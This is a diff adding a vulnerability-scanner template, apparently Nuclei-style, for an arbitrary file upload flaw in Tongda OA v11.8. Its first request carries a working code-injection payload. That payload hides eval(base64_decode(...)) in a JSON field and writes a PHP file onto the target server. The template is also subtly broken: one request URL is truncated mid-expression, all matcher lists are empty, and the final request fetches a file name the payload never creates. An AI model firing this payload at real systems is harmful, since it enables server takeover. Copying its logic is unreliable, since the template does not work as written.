@@ -1,0 +1,39 @@
+id: tongda-api-file-upload
+brief:
+    title: Tongda OA v11.8 api.ali.php - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.
+    label:
+        - tongda
+        - oa
+        - fileupload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/mobile/api/api.ali.php'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=502f67681799b07e5de6b503655f5cae
+      body: |-
+        --502f67681799b07e5de6b503655f5cae
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
+        Content-Type: application/octet-stream
+
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{"a":"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*"}"}
+        --502f67681799b07e5de6b503655f5cae--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M",'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{randstr}}.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs: []
